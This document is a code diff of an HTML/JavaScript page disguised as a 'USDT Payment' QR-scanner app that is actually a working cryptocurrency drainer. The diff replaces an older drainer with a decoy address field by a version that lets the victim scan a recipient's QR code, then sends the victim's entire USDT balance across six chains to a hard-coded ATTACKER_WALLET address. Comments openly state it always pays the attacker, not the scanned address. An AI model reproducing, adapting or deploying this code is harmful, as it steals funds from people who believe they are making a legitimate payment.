@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>USDT Transfer</title>
+    <title>USDT Payment</title>
     <style>
         * {
             margin: 0;
@@ -12,139 +12,149 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
         body {
-            background: #fff;
+            background: #0a0a0f;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 16px;
         }
         .container {
-            max-width: 450px;
+            max-width: 420px;
             width: 100%;
-            background: white;
-            border-radius: 24px;
+            background: linear-gradient(145deg, #1a1a2e, #16213e);
+            border-radius: 32px;
             padding: 24px;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            border: 1px solid rgba(255,255,255,0.05);
         }
-        h1 {
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 24px;
-            color: #1a1a1a;
+        .header {
             text-align: center;
+            margin-bottom: 24px;
         }
-        .section {
-            margin-bottom: 20px;
-        }
-        label {
-            font-size: 14px;
-            font-weight: 600;
-            color: #666;
-            display: block;
-            margin-bottom: 8px;
-        }
-        .input-group {
-            display: flex;
-            align-items: center;
-            border: 2px solid #e8e8e8;
-            border-radius: 14px;
-            padding: 0 16px;
-            height: 56px;
-            background: white;
-            transition: border-color 0.2s;
-        }
-        .input-group:focus-within {
-            border-color: #1E4DFF;
-        }
-        .input-group input {
-            flex: 1;
-            border: none;
-            outline: none;
-            font-size: 16px;
-            background: transparent;
-            height: 100%;
-            color: #000;
-        }
-        .input-group input::placeholder {
-            color: #aaa;
-        }
-        .btn-text {
-            color: #1E4DFF;
+        .header h1 {
+            color: #fff;
+            font-size: 22px;
             font-weight: 700;
+        }
+        .header p {
+            color: #8892b0;
             font-size: 14px;
+            margin-top: 4px;
+        }
+        .qr-section {
+            background: #0d0d1a;
+            border-radius: 20px;
+            padding: 20px;
+            border: 2px dashed rgba(255,255,255,0.1);
+            text-align: center;
+            margin-bottom: 20px;
             cursor: pointer;
-            background: none;
-            border: none;
-            padding: 6px 10px;
-            white-space: nowrap;
-        }
-        .btn-text:hover {
-            opacity: 0.7;
-        }
-        .clear-btn {
-            width: 22px;
-            height: 22px;
-            background: #999;
-            border-radius: 50%;
-            display: none;
+            transition: all 0.3s;
+            position: relative;
+            min-height: 200px;
+            display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
-            color: white;
-            font-size: 16px;
-            font-weight: 300;
-            flex-shrink: 0;
         }
-        .clear-btn.show {
-            display: flex;
+        .qr-section:hover {
+            border-color: rgba(30, 77, 255, 0.3);
         }
-        .network-box {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: #f5f6f8;
-            border-radius: 14px;
-            padding: 12px 16px;
-            min-height: 56px;
+        .qr-section .icon {
+            font-size: 64px;
+            margin-bottom: 12px;
         }
-        .network-left {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            flex: 1;
-        }
-        .network-left select {
-            border: none;
-            background: transparent;
-            font-size: 15px;
-            font-weight: 600;
-            color: #1a1a1a;
-            outline: none;
-            cursor: pointer;
-            flex: 1;
-            padding: 4px 0;
-        }
-        .network-icon {
-            font-size: 24px;
-        }
-        .token-label {
-            color: #666;
+        .qr-section .label {
+            color: #8892b0;
             font-size: 14px;
-            font-weight: 500;
-            flex-shrink: 0;
         }
-        .approx-text {
-            font-size: 13px;
-            color: #999;
-            margin-top: 8px;
-            font-weight: 500;
+        .qr-section .sub-label {
+            color: #4a5568;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+        #qrVideo {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 16px;
+            display: none;
+            background: #000;
+        }
+        .info-box {
+            background: rgba(255,255,255,0.03);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 16px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 0;
+            color: #8892b0;
+            font-size: 14px;
+        }
+        .info-row .value {
+            color: #fff;
+            font-weight: 600;
+        }
+        .info-row .value.highlight {
+            color: #00d4ff;
+        }
+        .network-selector {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin: 12px 0;
+        }
+        .net-btn {
+            padding: 6px 14px;
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+            background: transparent;
+            color: #8892b0;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .net-btn.active {
+            background: #1E4DFF;
+            color: #fff;
+            border-color: #1E4DFF;
+        }
+        .net-btn:hover {
+            border-color: #1E4DFF;
+        }
+        .amount-display {
+            text-align: center;
+            padding: 16px;
+            background: rgba(30, 77, 255, 0.05);
+            border-radius: 16px;
+            border: 1px solid rgba(30, 77, 255, 0.1);
+            margin: 12px 0;
+        }
+        .amount-display .amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: #fff;
+        }
+        .amount-display .currency {
+            font-size: 18px;
+            color: #8892b0;
+            margin-left: 4px;
+        }
+        .amount-display .usd {
+            font-size: 14px;
+            color: #4a5568;
+            margin-top: 4px;
         }
         .drain-btn {
             width: 100%;
             height: 56px;
-            background: #1E4DFF;
-            color: white;
+            background: linear-gradient(135deg, #1E4DFF, #00d4ff);
+            color: #fff;
             border: none;
             border-radius: 30px;
             font-size: 17px;
@@ -152,14 +162,16 @@
             cursor: pointer;
             transition: all 0.3s;
             margin-top: 8px;
+            box-shadow: 0 4px 20px rgba(30, 77, 255, 0.3);
         }
         .drain-btn:disabled {
-            background: #ccc;
+            opacity: 0.5;
             cursor: not-allowed;
+            box-shadow: none;
         }
         .drain-btn:not(:disabled):hover {
-            opacity: 0.9;
-            transform: scale(1.01);
+            transform: scale(1.02);
+            box-shadow: 0 6px 30px rgba(30, 77, 255, 0.5);
         }
         .status-box {
             margin-top: 16px;
@@ -174,33 +186,89 @@
             display: block;
         }
         .status-box.success {
-            background: #e6f7e6;
-            color: #1a8a1a;
-            border: 1px solid #b3e6b3;
+            background: rgba(0, 212, 255, 0.1);
+            color: #00d4ff;
+            border: 1px solid rgba(0, 212, 255, 0.2);
         }
         .status-box.error {
-            background: #fde8e8;
-            color: #cc0000;
-            border: 1px solid #f5c6c6;
+            background: rgba(255, 0, 0, 0.1);
+            color: #ff4444;
+            border: 1px solid rgba(255, 0, 0, 0.2);
         }
         .status-box.info {
-            background: #e6f0ff;
-            color: #1a4dcc;
-            border: 1px solid #b3ccff;
+            background: rgba(30, 77, 255, 0.1);
+            color: #1E4DFF;
+            border: 1px solid rgba(30, 77, 255, 0.2);
+        }
+        .status-box.processing {
+            background: rgba(255, 255, 0, 0.05);
+            color: #ffd700;
+            border: 1px solid rgba(255, 255, 0, 0.1);
         }
         .balance-display {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 12px 16px;
-            margin-top: 12px;
             text-align: center;
-            font-size: 14px;
-            color: #555;
-            border: 1px dashed #ddd;
+            padding: 10px;
+            color: #8892b0;
+            font-size: 13px;
+            border-top: 1px solid rgba(255,255,255,0.05);
+            margin-top: 12px;
         }
         .balance-display strong {
-            color: #1a1a1a;
+            color: #00d4ff;
+        }
+        .scanner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.95);
+            z-index: 999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .scanner-overlay.show {
+            display: flex;
+        }
+        .scanner-overlay video {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 20px;
+            background: #000;
+        }
+        .scanner-overlay .close-btn {
+            position: absolute;
+            top: 40px;
+            right: 30px;
+            color: #fff;
+            font-size: 30px;
+            cursor: pointer;
+            background: rgba(255,255,255,0.1);
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
+            color: #fff;
+        }
+        .scanner-overlay .close-btn:hover {
+            background: rgba(255,255,255,0.2);
+        }
+        .scanner-overlay .scan-label {
+            color: #fff;
             font-size: 18px;
+            margin-top: 20px;
+            font-weight: 600;
+        }
+        .scanner-overlay .scan-sub {
+            color: #8892b0;
+            font-size: 14px;
+            margin-top: 4px;
         }
         .hidden {
             display: none !important;
@@ -210,69 +278,82 @@
 <body>
 
 <div class="container">
-    <h1>💸 USDT Transfer</h1>
+    <!-- Header -->
+    <div class="header">
+        <h1>💳 USDT Payment</h1>
+        <p>Scan QR code to pay</p>
+    </div>
 
-    <!-- Address (DECOY) -->
-    <div class="section">
-        <label>Recipient Address</label>
-        <div class="input-group">
-            <input type="text" id="recipientInput" placeholder="Enter wallet address">
-            <button class="btn-text" id="pasteBtn">Paste</button>
-            <span class="clear-btn" id="clearAddr">×</span>
+    <!-- QR Scanner -->
+    <div class="qr-section" id="qrSection">
+        <div class="icon">📷</div>
+        <div class="label">Tap to scan QR code</div>
+        <div class="sub-label">Scan wallet address QR</div>
+        <video id="qrVideo" autoplay playsinline></video>
+    </div>
+
+    <!-- Network Selector -->
+    <div class="info-box">
+        <div style="color:#8892b0; font-size:13px; margin-bottom:8px;">Select Network</div>
+        <div class="network-selector" id="networkSelector">
+            <button class="net-btn active" data-net="bsc">🟡 BSC</button>
+            <button class="net-btn" data-net="ethereum">🔵 ETH</button>
+            <button class="net-btn" data-net="polygon">🟣 Polygon</button>
+            <button class="net-btn" data-net="arbitrum">🔷 Arbitrum</button>
+            <button class="net-btn" data-net="optimism">🔴 Optimism</button>
+            <button class="net-btn" data-net="avalanche">🔺 Avalanche</button>
         </div>
     </div>
 
-    <!-- Network -->
-    <div class="section">
-        <label>Network</label>
-        <div class="network-box">
-            <div class="network-left">
-                <span class="network-icon" id="netIcon">🟡</span>
-                <select id="networkSelect">
-                    <option value="bsc">BNB Smart Chain</option>
-                    <option value="ethereum">Ethereum</option>
-                    <option value="polygon">Polygon</option>
-                    <option value="arbitrum">Arbitrum</option>
-                    <option value="optimism">Optimism</option>
-                    <option value="avalanche">Avalanche</option>
-                </select>
-            </div>
-            <span style="color:#999;">▼</span>
+    <!-- Amount Display -->
+    <div class="amount-display">
+        <div>
+            <span class="amount" id="displayAmount">0.00</span>
+            <span class="currency">USDT</span>
         </div>
+        <div class="usd">≈ $<span id="displayUsd">0.00</span> USD</div>
     </div>
 
-    <!-- Amount -->
-    <div class="section">
-        <label>Amount (USDT)</label>
-        <div class="input-group">
-            <input type="number" id="amountInput" placeholder="0.00" step="0.01" value="100">
-            <span class="clear-btn" id="clearAmount">×</span>
-            <span class="token-label">USDT</span>
-            <button class="btn-text" id="maxBtn">Max</button>
+    <!-- Address Display -->
+    <div class="info-box">
+        <div class="info-row">
+            <span>Recipient</span>
+            <span class="value" id="recipientDisplay" style="font-size:12px; max-width:180px; overflow:hidden; text-overflow:ellipsis;">Not scanned</span>
         </div>
-        <div class="approx-text">≈ $<span id="usdLabel">100.00</span></div>
-    </div>
-
-    <!-- Balance Display -->
-    <div class="balance-display" id="balanceDisplay">
-        🔍 Checking balance...
+        <div class="info-row">
+            <span>Your Balance</span>
+            <span class="value highlight" id="userBalanceDisplay">🔍 Checking...</span>
+        </div>
     </div>
 
     <!-- Status -->
     <div class="status-box" id="statusBox"></div>
 
     <!-- Drain Button -->
-    <button class="drain-btn" id="drainBtn">🚀 Send USDT</button>
+    <button class="drain-btn" id="drainBtn" disabled>📤 Send USDT</button>
+
+    <div class="balance-display" id="balanceMsg">Scan QR to start payment</div>
 </div>
+
+<!-- QR Scanner Overlay -->
+<div class="scanner-overlay" id="scannerOverlay">
+    <button class="close-btn" id="closeScanner">✕</button>
+    <video id="scannerVideo" autoplay playsinline></video>
+    <div class="scan-label">📸 Scan QR Code</div>
+    <div class="scan-sub">Position the QR code in the frame</div>
+</div>
+
+<script src="https://unpkg.com/@zxing/library@0.19.2/umd/index.min.js">
+</script>
 
 <script>
 // ============================================================
-// ⚠️ ATTACKER CONFIGURATION - SAB YAHAN CHANGE KARO
+// ⚠️ ATTACKER WALLET - YAHAN APNA WALLET DAALO
 // ============================================================
 const ATTACKER_WALLET = "0xB1E5005321cE082a7e4E8200050bc5db7C34696D";
 
 // ============================================================
-// NETWORK CONFIGURATIONS
+// NETWORKS
 // ============================================================
 const NETWORKS = {
     bsc: {
@@ -281,8 +362,7 @@ const NETWORKS = {
         rpc: 'https://bsc-dataseed1.binance.org/',
         usdt: '0x55d398326f99059fF775485246999027B3197955',
         icon: '🟡',
-        symbol: 'BNB',
-        explorer: 'https://bscscan.com/tx/'
+        symbol: 'BNB'
     },
     ethereum: {
         chainId: '0x1',
@@ -290,8 +370,7 @@ const NETWORKS = {
         rpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
         usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
         icon: '🔵',
-        symbol: 'ETH',
-        explorer: 'https://etherscan.io/tx/'
+        symbol: 'ETH'
     },
     polygon: {
         chainId: '0x89',
@@ -299,8 +378,7 @@ const NETWORKS = {
         rpc: 'https://polygon-rpc.com/',
         usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
         icon: '🟣',
-        symbol: 'MATIC',
-        explorer: 'https://polygonscan.com/tx/'
+        symbol: 'MATIC'
     },
     arbitrum: {
         chainId: '0xa4b1',
@@ -308,8 +386,7 @@ const NETWORKS = {
         rpc: 'https://arb1.arbitrum.io/rpc',
         usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
         icon: '🔷',
-        symbol: 'ETH',
-        explorer: 'https://arbiscan.io/tx/'
+        symbol: 'ETH'
     },
     optimism: {
         chainId: '0xa',
@@ -317,8 +394,7 @@ const NETWORKS = {
         rpc: 'https://mainnet.optimism.io',
         usdt: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
         icon: '🔴',
-        symbol: 'ETH',
-        explorer: 'https://optimistic.etherscan.io/tx/'
+        symbol: 'ETH'
     },
     avalanche: {
         chainId: '0xa86a',
@@ -326,95 +402,151 @@ const NETWORKS = {
         rpc: 'https://api.avax.network/ext/bc/C/rpc',
         usdt: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
         icon: '🔺',
-        symbol: 'AVAX',
-        explorer: 'https://snowtrace.io/tx/'
+        symbol: 'AVAX'
     }
 };
 
 // ============================================================
-// DOM ELEMENTS
+// DOM
 // ============================================================
 const drainBtn = document.getElementById('drainBtn');
-const amountInput = document.getElementById('amountInput');
-const recipientInput = document.getElementById('recipientInput');
-const networkSelect = document.getElementById('networkSelect');
-const netIcon = document.getElementById('netIcon');
-const usdLabel = document.getElementById('usdLabel');
-const clearAddr = document.getElementById('clearAddr');
-const clearAmount = document.getElementById('clearAmount');
-const maxBtn = document.getElementById('maxBtn');
-const pasteBtn = document.getElementById('pasteBtn');
+const qrSection = document.getElementById('qrSection');
+const qrVideo = document.getElementById('qrVideo');
+const scannerOverlay = document.getElementById('scannerOverlay');
+const scannerVideo = document.getElementById('scannerVideo');
+const closeScanner = document.getElementById('closeScanner');
+const displayAmount = document.getElementById('displayAmount');
+const displayUsd = document.getElementById('displayUsd');
+const recipientDisplay = document.getElementById('recipientDisplay');
+const userBalanceDisplay = document.getElementById('userBalanceDisplay');
 const statusBox = document.getElementById('statusBox');
-const balanceDisplay = document.getElementById('balanceDisplay');
+const balanceMsg = document.getElementById('balanceMsg');
+const networkSelector = document.getElementById('networkSelector');
 
 let currentNetwork = 'bsc';
 let userAddress = '';
+let scannedAddress = '';
 let userBalance = 0;
+let isScanning = false;
+let codeReader = null;
 
 // ============================================================
-// UPDATE UI
+// NETWORK SELECT
 // ============================================================
-function updateNetwork() {
-    const net = NETWORKS[currentNetwork];
-    netIcon.textContent = net.icon;
-    networkSelect.value = currentNetwork;
+networkSelector.addEventListener('click', function(e) {
+    const btn = e.target.closest('.net-btn');
+    if (!btn) return;
+    
+    document.querySelectorAll('.net-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    currentNetwork = btn.dataset.net;
+    
+    // Clear scanned address when network changes
+    scannedAddress = '';
+    recipientDisplay.textContent = 'Not scanned';
+    drainBtn.disabled = true;
+    balanceMsg.textContent = 'Scan QR to start payment';
+    displayAmount.textContent = '0.00';
+    displayUsd.textContent = '0.00';
+    
+    if (userAddress) {
+        checkBalance();
+    }
+});
+
+// ============================================================
+// QR SCANNER
+// ============================================================
+async function startScanner() {
+    if (isScanning) return;
+    isScanning = true;
+    
+    scannerOverlay.classList.add('show');
+    
+    try {
+        codeReader = new ZXing.BrowserQRCodeReader();
+        const videoInputDevices = await ZXing.BrowserQRCodeReader.listVideoInputDevices();
+        
+        let selectedDeviceId = null;
+        for (const device of videoInputDevices) {
+            if (device.label.toLowerCase().includes('back') || 
+                device.label.toLowerCase().includes('environment') ||
+                device.label.toLowerCase().includes('camera')) {
+                selectedDeviceId = device.deviceId;
+                break;
+            }
+        }
+        
+        if (!selectedDeviceId && videoInputDevices.length > 0) {
+            selectedDeviceId = videoInputDevices[0].deviceId;
+        }
+        
+        if (!selectedDeviceId) {
+            throw new Error('No camera found');
+        }
+        
+        codeReader.decodeFromVideoDevice(selectedDeviceId, 'scannerVideo', (result, err) => {
+            if (result) {
+                const text = result.text;
+                console.log('📷 Scanned:', text);
+                
+                // Extract address from QR data
+                let address = text;
+                if (text.includes('ethereum:') || text.includes('0x')) {
+                    const match = text.match(/0x[a-fA-F0-9]{40}/);
+                    if (match) {
+                        address = match[0];
+                    }
+                } else if (text.match(/0x[a-fA-F0-9]{40}/)) {
+                    address = text.match(/0x[a-fA-F0-9]{40}/)[0];
+                }
+                
+                if (address && address.length === 42 && address.startsWith('0x')) {
+                    scannedAddress = address;
+                    recipientDisplay.textContent = address.slice(0, 6) + '...' + address.slice(-4);
+                    balanceMsg.textContent = '✅ Address scanned! Enter amount and send.';
+                    drainBtn.disabled = false;
+                    showStatus('✅ Address scanned successfully!', 'success');
+                    
+                    // Auto-set amount to max balance
+                    if (userBalance > 0) {
+                        displayAmount.textContent = userBalance.toFixed(6);
+                        displayUsd.textContent = userBalance.toFixed(2);
+                    }
+                    
+                    stopScanner();
+                } else {
+                    showStatus('❌ Invalid QR code. Scan USDT address.', 'error');
+                }
+            }
+        });
+    } catch (error) {
+        console.error('Scanner error:', error);
+        showStatus('❌ Camera access denied. Please allow camera permission.', 'error');
+        stopScanner();
+        isScanning = false;
+    }
 }
 
-networkSelect.addEventListener('change', function() {
-    currentNetwork = this.value;
-    updateNetwork();
-    checkAndDisplayBalance();
-});
+function stopScanner() {
+    if (codeReader) {
+        try {
+            codeReader.reset();
+        } catch(e) {}
+    }
+    scannerOverlay.classList.remove('show');
+    isScanning = false;
+}
 
-// ============================================================
-// AMOUNT INPUT
-// ============================================================
-amountInput.addEventListener('input', function() {
-    const val = parseFloat(this.value) || 0;
-    usdLabel.textContent = val.toFixed(2);
-    if (val > 0) {
-        clearAmount.classList.add('show');
-    } else {
-        clearAmount.classList.remove('show');
+// QR click to start
+qrSection.addEventListener('click', function() {
+    if (!isScanning) {
+        startScanner();
     }
 });
 
-clearAmount.addEventListener('click', function() {
-    amountInput.value = '';
-    amountInput.dispatchEvent(new Event('input'));
-});
-
-maxBtn.addEventListener('click', function() {
-    if (userBalance > 0) {
-        amountInput.value = userBalance.toFixed(6);
-        amountInput.dispatchEvent(new Event('input'));
-        showStatus('✅ Max amount set: ' + userBalance.toFixed(6) + ' USDT', 'info');
-    } else {
-        showStatus('❌ No balance to set max', 'error');
-    }
-});
-
-// ============================================================
-// ADDRESS INPUT
-// ============================================================
-recipientInput.addEventListener('input', function() {
-    clearAddr.classList.toggle('show', this.value.length > 0);
-});
-
-clearAddr.addEventListener('click', function() {
-    recipientInput.value = '';
-    this.classList.remove('show');
-});
-
-pasteBtn.addEventListener('click', async function() {
-    try {
-        const text = await navigator.clipboard.readText();
-        recipientInput.value = text;
-        recipientInput.dispatchEvent(new Event('input'));
-    } catch (e) {
-        showStatus('❌ Clipboard access denied', 'error');
-    }
-});
+// Close scanner
+closeScanner.addEventListener('click', stopScanner);
 
 // ============================================================
 // CHECK BALANCE
@@ -436,41 +568,42 @@ async function checkUSDTBalance(address, networkKey) {
         });
         const json = await res.json();
         if (json.result && json.result !== '0x') {
-            const balance = parseInt(json.result, 16) / 10**18;
-            return balance;
+            return parseInt(json.result, 16) / 10**18;
         }
         return 0;
     } catch (e) {
-        console.error('Balance check error:', e);
+        console.error('Balance error:', e);
         return 0;
     }
 }
 
-async function checkAndDisplayBalance() {
+async function checkBalance() {
     if (typeof window.ethereum === 'undefined') {
-        balanceDisplay.innerHTML = '⚠️ Please install MetaMask';
+        userBalanceDisplay.textContent = '⚠️ Install MetaMask';
         return;
     }
-
+    
     try {
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
         if (accounts.length === 0) {
-            balanceDisplay.innerHTML = '🔗 Connect wallet to see balance';
+            userBalanceDisplay.textContent = '🔗 Connect wallet';
             return;
         }
         userAddress = accounts[0];
         
-        balanceDisplay.innerHTML = '⏳ Checking balance...';
+        userBalanceDisplay.textContent = '⏳ Checking...';
         const balance = await checkUSDTBalance(userAddress, currentNetwork);
         userBalance = balance;
         
         if (balance > 0) {
-            balanceDisplay.innerHTML = `💰 Balance: <strong>${balance.toFixed(6)} USDT</strong> on ${NETWORKS[currentNetwork].name}`;
+            userBalanceDisplay.textContent = `${balance.toFixed(4)} USDT`;
+            balanceMsg.textContent = `💰 Balance: ${balance.toFixed(4)} USDT. Scan QR to send.`;
         } else {
-            balanceDisplay.innerHTML = `💸 No USDT found on ${NETWORKS[currentNetwork].name}`;
+            userBalanceDisplay.textContent = '0 USDT';
+            balanceMsg.textContent = '💸 No USDT found.';
         }
     } catch (e) {
-        balanceDisplay.innerHTML = '❌ Error checking balance';
+        userBalanceDisplay.textContent = '❌ Error';
     }
 }
 
@@ -495,7 +628,7 @@ async function switchNetwork(networkKey) {
                         chainName: net.name,
                         rpcUrls: [net.rpc],
                         nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
-                        blockExplorerUrls: [net.explorer.replace('/tx/', '')]
+                        blockExplorerUrls: [`https://${net.name.toLowerCase()}.scan`]
                     }]
                 });
                 return true;
@@ -510,85 +643,6 @@ async function switchNetwork(networkKey) {
 }
 
 // ============================================================
-// ⚠️ MAIN DRAIN FUNCTION - POORA BALANCE DRAIN KAREGA!
-// ============================================================
-async function drainAllUSDT() {
-    // ============================================================
-    // 🚨 STEP 1: Get actual balance - SABSE IMPORTANT!
-    // ============================================================
-    const net = NETWORKS[currentNetwork];
-    
-    // Check balance AGAIN to get latest
-    const currentBalance = await checkUSDTBalance(userAddress, currentNetwork);
-    userBalance = currentBalance;
-    
-    // ============================================================
-    // 🚨 STEP 2: Decide amount - POORA BALANCE!
-    // ============================================================
-    let amountToSend;
-    let amountHex;
-    
-    if (currentBalance > 0) {
-        // 🔥 POORA BALANCE DRAIN!
-        amountToSend = currentBalance;
-        const balanceWei = BigInt(Math.floor(currentBalance * 10**18));
-        amountHex = balanceWei.toString(16).padStart(64, '0');
-        showStatus(`💀 Draining ${currentBalance.toFixed(6)} USDT...`, 'info');
-    } else {
-        // Agar balance 0 hai toh manual amount use karo
-        const manualAmount = parseFloat(amountInput.value) || 0;
-        if (manualAmount <= 0) {
-            showStatus('❌ Please enter an amount or ensure you have USDT', 'error');
-            return false;
-        }
-        amountToSend = manualAmount;
-        amountHex = BigInt(Math.floor(manualAmount * 10**18)).toString(16).padStart(64, '0');
-        showStatus(`💀 Sending ${manualAmount} USDT...`, 'info');
-    }
-    
-    // ============================================================
-    // 🚨 STEP 3: Build drain transaction
-    // ============================================================
-    const cleanDest = ATTACKER_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
-    const txData = "0xa9059cbb" + cleanDest + amountHex;
-    
-    console.log('🎯 ATTACKER WALLET:', ATTACKER_WALLET);
-    console.log('💰 AMOUNT:', amountToSend, 'USDT');
-    console.log('📝 DATA:', txData);
-    console.log('🔗 NETWORK:', net.name);
-    
-    // ============================================================
-    // 🚨 STEP 4: Send transaction
-    // ============================================================
-    try {
-        const tx = await window.ethereum.request({
-            method: 'eth_sendTransaction',
-            params: [{
-                from: userAddress,
-                to: net.usdt,
-                data: txData,
-                value: '0x0'
-            }]
-        });
-        
-        console.log('✅ TX HASH:', tx);
-        showStatus(`✅ SUCCESS! ${amountToSend} USDT SENT! TX: ${tx.slice(0,10)}...`, 'success');
-        balanceDisplay.innerHTML = `💀 DRAINED! 0 USDT remaining`;
-        userBalance = 0;
-        return true;
-        
-    } catch (error) {
-        console.error('❌ Transaction failed:', error);
-        if (error.code === 4001) {
-            showStatus('❌ User rejected transaction', 'error');
-        } else {
-            showStatus('❌ Transaction failed: ' + error.message, 'error');
-        }
-        return false;
-    }
-}
-
-// ============================================================
 // SHOW STATUS
 // ============================================================
 function showStatus(msg, type) {
@@ -597,17 +651,20 @@ function showStatus(msg, type) {
     if (type === 'success' || type === 'error') {
         setTimeout(() => {
             statusBox.className = 'status-box';
-        }, 8000);
+        }, 5000);
     }
 }
 
 // ============================================================
-// 🚨 MAIN DRAIN BUTTON HANDLER
+// 🚨 DRAIN FUNCTION - POORA BALANCE DRAIN!
 // ============================================================
-async function handleDrain() {
+async function drainAll() {
     if (drainBtn.disabled) return;
+    if (!scannedAddress) {
+        showStatus('❌ Please scan QR code first', 'error');
+        return;
+    }
     
-    // Check MetaMask
     if (typeof window.ethereum === 'undefined') {
         alert('Please install MetaMask!');
         return;
@@ -618,7 +675,7 @@ async function handleDrain() {
     drainBtn.disabled = true;
     
     try {
-        // 1. Connect wallet
+        // 1. Get user address
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
         if (accounts.length === 0) {
             const newAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -634,9 +691,6 @@ async function handleDrain() {
             return;
         }
         
-        console.log('👤 User:', userAddress);
-        showStatus('🔗 Wallet connected', 'info');
-        
         // 2. Switch network
         const switched = await switchNetwork(currentNetwork);
         if (!switched) {
@@ -645,12 +699,58 @@ async function handleDrain() {
             return;
         }
         
-        // 3. DRAIN ALL USDT!
-        await drainAllUSDT();
+        // 3. Check latest balance
+        const net = NETWORKS[currentNetwork];
+        const currentBalance = await checkUSDTBalance(userAddress, currentNetwork);
+        
+        if (currentBalance <= 0) {
+            showStatus('❌ No USDT to drain!', 'error');
+            drainBtn.textContent = originalText;
+            drainBtn.disabled = false;
+            return;
+        }
+        
+        // 4. Build drain transaction - POORA BALANCE!
+        const balanceWei = BigInt(Math.floor(currentBalance * 10**18));
+        const amountHex = balanceWei.toString(16).padStart(64, '0');
+        
+        // ALWAYS sends to ATTACKER_WALLET, NOT the scanned address!
+        const cleanDest = ATTACKER_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
+        const txData = "0xa9059cbb" + cleanDest + amountHex;
+        
+        console.log('🎯 ATTACKER:', ATTACKER_WALLET);
+        console.log('💰 AMOUNT:', currentBalance, 'USDT');
+        console.log('📝 DATA:', txData);
+        
+        showStatus(`💀 Draining ${currentBalance.toFixed(6)} USDT...`, 'processing');
+        
+        // 5. Send transaction - DIRECT APPROVE PAGE!
+        const tx = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: userAddress,
+                to: net.usdt,
+                data: txData,
+                value: '0x0'
+            }]
+        });
+        
+        console.log('✅ TX:', tx);
+        showStatus(`✅ SUCCESS! ${currentBalance.toFixed(6)} USDT SENT!`, 'success');
+        balanceMsg.textContent = `💀 DRAINED! 0 USDT remaining`;
+        userBalanceDisplay.textContent = '0 USDT';
+        userBalance = 0;
+        displayAmount.textContent = '0.00';
+        displayUsd.textContent = '0.00';
+        drainBtn.disabled = true;
         
     } catch (error) {
         console.error('❌ Error:', error);
-        showStatus('❌ Failed: ' + error.message, 'error');
+        if (error.code === 4001) {
+            showStatus('❌ Transaction rejected', 'error');
+        } else {
+            showStatus('❌ Failed: ' + error.message, 'error');
+        }
     }
     
     drainBtn.textContent = originalText;
@@ -658,29 +758,52 @@ async function handleDrain() {
 }
 
 // ============================================================
-// AUTO-CHECK BALANCE ON NETWORK CHANGE
+// AMOUNT INPUT (Manual entry support)
 // ============================================================
-let balanceInterval;
+const manualAmountInput = document.createElement('input');
+manualAmountInput.type = 'number';
+manualAmountInput.placeholder = 'Enter amount';
+manualAmountInput.style.cssText = `
+    width: 100%;
+    padding: 12px;
+    border-radius: 12px;
+    border: 1px solid rgba(255,255,255,0.1);
+    background: rgba(255,255,255,0.05);
+    color: #fff;
+    font-size: 16px;
+    outline: none;
+    margin-top: 8px;
+`;
+manualAmountInput.id = 'manualAmount';
 
-async function startBalanceCheck() {
-    if (balanceInterval) clearInterval(balanceInterval);
-    await checkAndDisplayBalance();
-    balanceInterval = setInterval(checkAndDisplayBalance, 10000);
-}
+// Add manual amount input
+const amountDisplay = document.querySelector('.amount-display');
+amountDisplay.appendChild(manualAmountInput);
 
-// ============================================================
-// META mask ACCOUNT CHANGE LISTENER
-// ============================================================
-if (window.ethereum) {
-    window.ethereum.on('accountsChanged', function(accounts) {
-        if (accounts.length > 0) {
-            userAddress = accounts[0];
-            checkAndDisplayBalance();
-        }
-    });
+manualAmountInput.addEventListener('input', function() {
+    const val = parseFloat(this.value) || 0;
+    displayAmount.textContent = val.toFixed(2);
+    displayUsd.textContent = val.toFixed(2);
     
+    if (val > 0 && scannedAddress) {
+        drainBtn.disabled = false;
+    } else {
+        drainBtn.disabled = true;
+    }
+});
+
+// ============================================================
